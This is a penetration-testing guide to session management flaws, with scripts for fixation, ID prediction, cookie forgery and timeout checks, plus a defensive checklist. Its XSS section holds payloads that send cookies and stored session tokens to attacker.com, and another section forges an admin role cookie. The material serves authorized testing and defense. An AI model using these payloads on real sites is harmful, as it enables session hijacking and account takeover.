# Session Management Attacks Guide

> Practical techniques for testing session management including session fixation, prediction, hijacking, cookie manipulation, and session lifecycle vulnerabilities.

---

## 1. Session Fixation Attacks

Session fixation forces a victim to use an attacker-controlled session ID, granting the attacker access after the victim authenticates.

```bash
# Test if application accepts externally set session IDs
# Step 1: Get a valid session ID (as attacker)
ATTACKER_SESSION=$(curl -s -c - https://target.com/login | grep -oP 'PHPSESSID=\K[a-zA-Z0-9]+')
echo "Attacker session: $ATTACKER_SESSION"

# Step 2: Test if this session persists after authentication
# (Simulate victim logging in with attacker's session)
curl -s -b "PHPSESSID=$ATTACKER_SESSION" \
  -X POST https://target.com/login \
  -d "username=victim&password=victimpass" \
  -o /dev/null -w "%{http_code}"

# Step 3: Check if attacker can now access authenticated content
curl -s -b "PHPSESSID=$ATTACKER_SESSION" \
  https://target.com/dashboard | grep -i "welcome\|profile\|logout"
# If content appears -> VULNERABLE (session not regenerated after login)
```

```python
# Automated session fixation test
import requests

target = "https://target.com"

# Get pre-auth session
s1 = requests.Session()
s1.get(f"{target}/login")
pre_auth_cookies = dict(s1.cookies)
print(f"Pre-auth session: {pre_auth_cookies}")

# Authenticate with this session
s1.post(f"{target}/login", data={"username": "testuser", "password": "testpass"})
post_auth_cookies = dict(s1.cookies)
print(f"Post-auth session: {post_auth_cookies}")

# Compare session IDs
for name in pre_auth_cookies:
    if name in post_auth_cookies:
        if pre_auth_cookies[name] == post_auth_cookies[name]:
            print(f"VULNERABLE: {name} not regenerated after authentication!")
        else:
            print(f"SECURE: {name} regenerated after authentication")
```

---

## 2. Session ID Prediction

```python
# Collect session IDs to analyze randomness and predictability
import requests
import string
from collections import Counter

target = "https://target.com"
sessions = []

# Collect 100 session IDs
for i in range(100):
    resp = requests.get(f"{target}/login")
    for cookie in resp.cookies:
        if "session" in cookie.name.lower() or "sid" in cookie.name.lower():
            sessions.append(cookie.value)
            break

print(f"Collected {len(sessions)} session IDs")
print(f"Sample: {sessions[:5]}")

# Analyze characteristics
lengths = [len(s) for s in sessions]
print(f"Length range: {min(lengths)} - {max(lengths)}")
print(f"Unique lengths: {set(lengths)}")

# Character set analysis
all_chars = "".join(sessions)
char_freq = Counter(all_chars)
charset = set(all_chars)
print(f"Character set size: {len(charset)}")
print(f"Hex only: {charset.issubset(set(string.hexdigits))}")

# Sequential analysis (check for incrementing patterns)
if all(s.isdigit() for s in sessions):
    diffs = [int(sessions[i+1]) - int(sessions[i]) for i in range(len(sessions)-1)]
    print(f"VULNERABLE: Numeric sessions with diffs: {set(diffs)}")

# Entropy estimation
import math
entropy_per_char = math.log2(len(charset)) if charset else 0
total_entropy = entropy_per_char * min(lengths)
print(f"Estimated entropy: {total_entropy:.1f} bits")
print(f"{'WEAK' if total_entropy < 64 else 'ACCEPTABLE' if total_entropy < 128 else 'STRONG'}")
```

---

## 3. Session Hijacking via XSS

```javascript
// Cookie theft payload (for authorized XSS testing)
// Basic cookie exfiltration
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// Bypass HttpOnly via TRACE method (older servers)
<script>
var xhr = new XMLHttpRequest();
xhr.open('TRACE', '/', false);
xhr.send();
// Response includes cookies in headers if TRACE enabled
fetch('https://attacker.com/steal?h=' + encodeURIComponent(xhr.responseText));
</script>

// Session token from JavaScript-accessible storage
<script>
var token = localStorage.getItem('session_token') || 
            sessionStorage.getItem('auth_token');
if (token) {
  fetch('https://attacker.com/steal?t=' + encodeURIComponent(token));
}
</script>
```

```bash
# Test cookie security attributes
curl -sI https://target.com/login -X POST \
  -d "username=test&password=test" | grep -i "set-cookie"

# Expected secure attributes:
# Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

# Check for missing flags
curl -sI https://target.com/ | grep -i "set-cookie" | while read -r line; do
  echo "$line"
  echo "$line" | grep -qi "httponly" || echo "  WARNING: Missing HttpOnly"
  echo "$line" | grep -qi "secure" || echo "  WARNING: Missing Secure"
  echo "$line" | grep -qi "samesite" || echo "  WARNING: Missing SameSite"
done
```

---

## 4. Cookie Manipulation Attacks

```python
# Test cookie-based privilege escalation
import requests
import base64
import json

target = "https://target.com"

# Login as regular user
s = requests.Session()
s.post(f"{target}/login", data={"username": "user", "password": "userpass"})

# Inspect cookies for encoded data
for cookie in s.cookies:
    print(f"Cookie: {cookie.name} = {cookie.value}")
    
    # Try base64 decode
    try:
        decoded = base64.b64decode(cookie.value + "==")
        print(f"  Base64 decoded: {decoded}")
        # If it's JSON, try modifying role
        data = json.loads(decoded)
        if "role" in data:
            data["role"] = "admin"
            forged = base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
            print(f"  Forged cookie: {forged}")
            # Test forged cookie
            resp = requests.get(f"{target}/admin", cookies={cookie.name: forged})
            print(f"  Admin access: {resp.status_code}")
    except Exception:
        pass

    # Try URL decode
    from urllib.parse import unquote
    decoded_url = unquote(cookie.value)
    if decoded_url != cookie.value:
        print(f"  URL decoded: {decoded_url}")
```

```bash
# Test session cookie scope issues
# Overly broad domain scope allows subdomain attacks
curl -sI https://target.com/ | grep -i "set-cookie" | grep -oP 'domain=[^;]*'

# Overly broad path scope
curl -sI https://target.com/ | grep -i "set-cookie" | grep -oP 'path=[^;]*'

# Test cookie without domain attribute (most restrictive - correct)
# vs domain=.target.com (accessible by all subdomains - risky)
```

---

## 5. Session Lifecycle Testing

```python
# Comprehensive session lifecycle validation
import requests
import time

target = "https://target.com"

# Test 1: Session timeout enforcement
s = requests.Session()
s.post(f"{target}/login", data={"username": "test", "password": "testpass"})
session_cookie = dict(s.cookies)

# Wait and check if session expires (adjust timeout as needed)
print("Testing session timeout...")
time.sleep(1800)  # 30 minutes
resp = requests.get(f"{target}/dashboard", cookies=session_cookie)
print(f"After 30min: {resp.status_code} - {'EXPIRED' if resp.status_code in [401, 302] else 'STILL VALID'}")

# Test 2: Concurrent session limits
sessions = []
for i in range(5):
    s = requests.Session()
    s.post(f"{target}/login", data={"username": "test", "password": "testpass"})
    sessions.append(s)

# Check if all sessions are still valid
for i, s in enumerate(sessions):
    resp = s.get(f"{target}/dashboard")
    print(f"Session {i}: {resp.status_code}")

# Test 3: Logout invalidation
s = requests.Session()
s.post(f"{target}/login", data={"username": "test", "password": "testpass"})
logout_cookies = dict(s.cookies)
s.post(f"{target}/logout")

# Try using the old session after logout
resp = requests.get(f"{target}/dashboard", cookies=logout_cookies)
print(f"After logout: {resp.status_code} - {'VULNERABLE' if resp.status_code == 200 else 'PROPERLY INVALIDATED'}")
```

```bash
# Test absolute session timeout vs idle timeout
# Absolute: session expires regardless of activity
# Idle: session expires after period of inactivity

# Keep session alive with periodic requests
TOKEN="session_cookie_value"
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "session=$TOKEN" https://target.com/dashboard)
  echo "Request $i ($(date +%H:%M:%S)): HTTP $STATUS"
  [ "$STATUS" != "200" ] && echo "Session expired after $i requests" && break
  sleep 60  # Request every minute
done
```

---

## 6. Defense Validation

```yaml
# Session management security checklist
session_security:
  generation:
    - entropy: ">= 128 bits"
    - algorithm: "cryptographically secure PRNG"
    - regenerate_after_auth: true
    - regenerate_after_privilege_change: true
    
  storage:
    - httponly: true
    - secure: true
    - samesite: "Strict or Lax"
    - domain: "most restrictive (no leading dot)"
    - path: "most restrictive"
    
  lifecycle:
    - absolute_timeout: "8 hours max"
    - idle_timeout: "30 minutes"
    - concurrent_limit: "configurable"
    - logout_invalidation: "server-side destruction"
    
  transport:
    - tls_only: true
    - no_url_parameters: true
    - no_referrer_leakage: true
```

Session management testing should cover the full lifecycle from creation through destruction. Always verify that session IDs are regenerated after authentication state changes and properly invalidated on logout.
